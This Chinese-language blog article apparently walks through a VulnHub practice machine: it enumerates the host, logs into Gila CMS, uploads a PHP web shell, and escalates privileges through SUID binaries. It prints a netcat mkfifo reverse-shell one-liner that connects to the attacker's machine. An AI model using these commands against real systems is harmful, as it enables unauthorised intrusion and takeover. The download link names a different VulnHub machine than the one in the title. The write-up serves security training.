<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/u0ebduOJpNVOivegrsbbVw)

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUMBPCrJh6cZ8rMIZR7XibLvib59JAgJjW942pLNKj1ZwP0gbC68Qz3Tsiaxry5oAeEUVf1vJ29g6Nqw/640?wx_fmt=png)

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，雷神众测及文章作者不为此承担任何责任。

雷神众测拥有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经雷神众测允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。

![图片](https://mmbiz.qpic.cn/mmbiz_svg/ofvnGicEPbfSzSpQGue94NX1iaQe23uVgclAfoicAJbGNCorlPRhG1TiaqV6ZBib251XF13a2JiaD0ajVA44yDr3K0oQmE0EO8mamY/640?wx_fmt=svg)

  

靶机简介

Name: hackNos: Os-hackNos-3  
Difficulty:Intermediate  
Flag : 2 Flag first user And second root  
Learning:Web Application | Enumeration | Privilege Escalation  
靶机下载地址：

https://www.vulnhub.com/entry/jangow-101,754/

  

![图片](https://mmbiz.qpic.cn/mmbiz_svg/ofvnGicEPbfSzSpQGue94NX1iaQe23uVgclAfoicAJbGNCorlPRhG1TiaqV6ZBib251XF13a2JiaD0ajVA44yDr3K0oQmE0EO8mamY/640?wx_fmt=svg)

实验环境

```
攻击机：本机(192.168.11.1)、kali(192.168.11.143)<br style="visibility: visible;">靶机：Linux，IP自动获取<br style="visibility: visible;">攻击机与靶机都使用net网络连接，在同一网段下
```

![图片](https://mmbiz.qpic.cn/mmbiz_svg/ofvnGicEPbfSzSpQGue94NX1iaQe23uVgclAfoicAJbGNCorlPRhG1TiaqV6ZBib251XF13a2JiaD0ajVA44yDr3K0oQmE0EO8mamY/640?wx_fmt=svg)

渗透测试步骤

1、使用 nmap 扫描网段，获得靶机 IP

```
nmap -sn 192.168.11.0/24
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUMBPCrJh6cZ8rMIZR7XibLvQ2pjZEpqxPbaQOCicnlEwShSKhp3czAxdNTbkzKUDRfk8dCogn0tkmA/640?wx_fmt=png)

2、扫描目标端口，发现开放了 22 和 80 端口

```
nmap -sS -Pn -sC 192.168.11.163
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUMBPCrJh6cZ8rMIZR7XibLvvWNK1ZSgzUJPldlcaWyuR3RgQETYGJQiamVsDDNXyvlwS3L8MEuRwog/640?wx_fmt=png)

3、访问 80 端口

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUMBPCrJh6cZ8rMIZR7XibLvRRibibyHwGyXvTjqr0ibXqZcCk1iaAVmF26GDhAxfeuueJF1LZZZID5OIw/640?wx_fmt=png)

发现最下方提示需要额外的 WebSec 于是在 url 中添加 WebSec 路径，发现没什么，全部换成小写的试试，发现了一个新页面

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUMBPCrJh6cZ8rMIZR7XibLv9NsSpv6V0SoTJj9G8ibyRgBjIsvNxUAjkl2jH9DhUD62icib7dpoTb9iag/640?wx_fmt=png)

浏览发现了一个邮箱、网站、和一串数字

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUMBPCrJh6cZ8rMIZR7XibLv3UmGKl9NTDJY5sOPLtOZgicoUk4K8n7u51VbIgk2NRVNVzyr4A658sQ/640?wx_fmt=png)

4、目录扫描，发现了登录口

```
python dirsearch.py -u http://192.168.11.163/websec/
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUMBPCrJh6cZ8rMIZR7XibLv0RZmc4dcGt43auousdvsEW3a8hJCCOkTPOmOqVm48mSVKn6pjU5HFA/640?wx_fmt=png)

并且发现使用的是 Gila CMS

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUMBPCrJh6cZ8rMIZR7XibLv6km64W5d7ibD04yOGQyf4ZVxsEO3PUDVWLcchkmB0aibUJaECIssadlw/640?wx_fmt=png)

尝试使用之前发现的邮箱进行爆破无果  
5、查找 Gila CMS 漏洞，发现存在一个文件上传漏洞，但是需要先登录后台  
所以还是得用账号密码登录后台，根据现有的信息账号应该是出现在网页中的 contact@hacknos.com，联想到密码可能也在网页中，于是浏览网页找敏感词汇，最后发现是网页中出现的 Securityx

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUMBPCrJh6cZ8rMIZR7XibLvMlLibVgeYOhBKFL9OaXicSv9T5kJWEHSh0HJMia6JiaIXDWYia0XXsGoDLg/640?wx_fmt=png)

6、利用文件上传漏洞  
https://blog.csdn.net/xuandao_ahfengren/article/details/111357914  
访问如下路径：

```
http://192.168.11.163/websec/admin/fm?f=tmp
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUMBPCrJh6cZ8rMIZR7XibLvAfjwuHt2CLJ1IicrZU71SbAxl8tcZut1v9p88e2xAp2qpCZ5JQ00iaXg/640?wx_fmt=png)

点击 upload 上传一个 php 木马，可以看到是上传到了当前目录，

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUMBPCrJh6cZ8rMIZR7XibLvYkxVFe6QLbo6ulE3Sbkj6Bic0yeqa1KhvicMczvqdBJibmVDrnFjN98aA/640?wx_fmt=png)

修改目录下的 .htaccess 文件

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUMBPCrJh6cZ8rMIZR7XibLvJafFq4OKyiaIpohfWCgBnlQeAElgSBO5ydaQNj1F1wbdSLjuXBXvq7A/640?wx_fmt=png)

但是现在不知道具体是在哪个目录，可以点击上层目录查看

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUMBPCrJh6cZ8rMIZR7XibLveBQkqbF0iavC2jdjnBHm07fcQric1SuW0xmC9UfTogFBp4ib8xmVM1Ptw/640?wx_fmt=png)

发现这是 websec 目录下的一些文件，于是确定上传的木马在 websec/tmp/jiandan.php  
7、使用蚁剑成功连接

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUMBPCrJh6cZ8rMIZR7XibLvr60jknlslQK96Iib3UnDKhLqCytrJvyoX6aFVyic2mkBym7n3zqhTWPA/640?wx_fmt=png)

8、在 kali 开启监听

```
nc -lvp 2333
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUMBPCrJh6cZ8rMIZR7XibLvQPEY2QAb3tv5Eataweg4hibMnbxvpoQ35RyLwyuiclNic2ENu3vRxZKpg/640?wx_fmt=png)

打开蚁剑的虚拟终端，输入命令反弹 shell

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.11.143 2333 >/tmp/f
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUMBPCrJh6cZ8rMIZR7XibLvjHP4coEDfZQxGI6Ino2icbUHukapbxtMGPMzB6QibgngRFNFWzALGicWQ/640?wx_fmt=png)

9、获取普通权限下的 flag  
输入如下命令获取标准 shell

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUMBPCrJh6cZ8rMIZR7XibLvDVkUJWxYzSib5vZ5Jqor48EFo9jKfuIzm2tlwzibuBh4oKmEMHmYpRqg/640?wx_fmt=png)

10、提权  
这里用到的是 suid 提权  
使用如下命令查找拥有 suid 权限的文件

```
find / -perm -u=s -type f 2>/dev/null
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUMBPCrJh6cZ8rMIZR7XibLv09Uh0c2JjFQwIg5cquSyFLCicrD3B1ACEKxu9KIichoVNHA6G1b2jguA/640?wx_fmt=png)

如果不知道哪些可以利用，或者不知道用法，可以在下面这个网站进行查询  
https://gtfobins.github.io/

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUMBPCrJh6cZ8rMIZR7XibLvA9mkdvLn9LQdWOQYFyVGXLsuvbeRLpUfQp3KGbLu13UxITCXEww9nA/640?wx_fmt=png)

运行命令成功提取到 root

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUMBPCrJh6cZ8rMIZR7XibLvRbfic0Ig9akpicZgfmp8sotjVF6tibODcWCmwL0W5FgoYa3KYMAd0iangg/640?wx_fmt=png)

11、获得 root 下的 flag

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JUMBPCrJh6cZ8rMIZR7XibLvqcWNmBm9FZFqRev6ZCibvYDejlDHe27xzJRbUfJIsU4rm7La6qHJraA/640?wx_fmt=png)

![图片](https://mmbiz.qpic.cn/mmbiz_svg/ofvnGicEPbfSzSpQGue94NX1iaQe23uVgclAfoicAJbGNCorlPRhG1TiaqV6ZBib251XF13a2JiaD0ajVA44yDr3K0oQmE0EO8mamY/640?wx_fmt=svg)

  

总结

这个靶场总体来说还是比较简单的，难点在于根据网页上的信息才能进一步攻击，无论是找路径还是账号密码，毕竟是靶场，与实际情况还是有一些不同 (但是也有相同，就是对某个网站进行账号密码爆破时，可以根据网站的一些信息，比如网站名、域名等给密码字典加上一些前缀后缀，这样成功几率更大)，总的思路也是一样的，在发现了使用的 CMS 后，通过搜索对应 CMS 的漏洞，上传 php 木马，蚁剑连接之后反弹 shell，然后通过 suid 提权，成功拿到两个 flag。

**安恒信息**

✦

杭州亚运会网络安全服务官方合作伙伴

成都大运会网络信息安全类官方赞助商

武汉军运会、北京一带一路峰会

青岛上合峰会、上海进博会

厦门金砖峰会、G20 杭州峰会

支撑单位北京奥运会等近百场国家级

重大活动网络安保支撑单位

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/HxO8NorP4JUMBPCrJh6cZ8rMIZR7XibLvAwXxjmhcLjHIQOkfKvYbBExgFk5A4SAWOicHYPEflkcgIUDzHQl7o7g/640?wx_fmt=jpeg)

END

![图片](https://mmbiz.qpic.cn/mmbiz_gif/HxO8NorP4JUMBPCrJh6cZ8rMIZR7XibLvvtFva79v63q8ghGYhQa5FkDxq8fZpejlibaoUibNUX3L6gIZFvibsRdxA/640?wx_fmt=gif)

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/HxO8NorP4JUMBPCrJh6cZ8rMIZR7XibLvTfdC8Tj1lwUZx7xw4oI8ibDx0W2LaTMjoD0ibiboKykQDKJDP0eMkatwA/640?wx_fmt=jpeg)

![图片](https://mmbiz.qpic.cn/mmbiz_gif/HxO8NorP4JUMBPCrJh6cZ8rMIZR7XibLvdiaWqnNSrZicHjOEF9ic3RvmyITOQErONSS5ePrZHSWCWp4KGVsJ50Q4g/640?wx_fmt=gif)

**长按识别二维码关注我们**